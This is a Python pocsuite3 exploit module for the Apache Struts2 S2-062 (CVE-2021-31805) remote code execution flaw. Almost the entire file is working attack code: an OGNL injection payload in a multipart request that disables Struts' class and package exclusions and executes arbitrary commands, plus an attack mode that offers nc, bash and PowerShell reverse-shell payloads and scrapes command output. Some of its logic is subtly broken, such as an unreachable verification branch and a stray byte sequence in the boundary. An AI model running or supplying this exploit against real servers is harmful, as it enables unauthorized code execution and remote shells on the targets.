# !/usr/bin/env python
# -*- coding: UTF-8 -*-
from collections import OrderedDict
from urllib.parse import urlparse, urljoin
from lxml import etree
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD
import re

class Struts_RCE_CVE_2021_31805(POCBase):
    vulID = 'CVE-2021-31805'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-04-10'
    createDate = '2022-04-10'
    updateDate = '2022-04-10'
    references = ['']
    name = 'Struts_RCE_CVE_2021_31805'
    appPowerLink = ''
    appName = 'Struts'
    appVersion = """Struts 2.0.0 - Struts 2.5.29"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Remote code execution S2-062 (CVE-2021-31805) Due to Apache Struts2's incomplete fix for S2-061 (CVE-2020-17530), some tag attributes can still execute OGNL expressions, The vulnerability allows an attacker to construct malicious data to remotely execute arbitrary code.'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _check(self, url, cmd=""):
        self.timeout = 5
        path = "/"
        vul_url = urljoin(url, path)
        parse = urlparse(vul_url)
        cmd = cmd or "id"
        command = """
        ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'CMD'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94
        """
        command = command.replace("CMD", cmd)
        print("\033[1;31m\npayload:" + cmd + '\033[0m\n')
        headers = { "Host": "{}".format(parse.netloc),
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"}
        try:
            r = requests.post(vul_url, headers=headers, timeout=self.timeout, data=command, verify=False,allow_redirects=False)
        except Exception:
            return False
        else:
            if len(cmd) == 0:
                re_content_uid = "uid"
                status_uid = re.findall(re_content_uid, r.text)
                if len(status_uid):
                    print("true")
                    return True
                else:
                    return False

            else:
                re_content_id = 'id="[^"]{1,}'
                status_id = re.findall(re_content_id, r.text)
                if len(status_id) == 0:
                    return False
                results = r.text
                page = etree.HTML(results)
                content = page.xpath('//a[@id]/@id')
                cmd_result = list(content)[0]
                return url, cmd_result

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:

            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Command executed'] =  "\n" + p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        command = self.get_option("command")
        p = self._check(self.url, cmd=command)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['COMMAND_RESULT'] = "\n" + p[1]

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('url is not vulnerable')
        return output


register_poc(Struts_RCE_CVE_2021_31805)
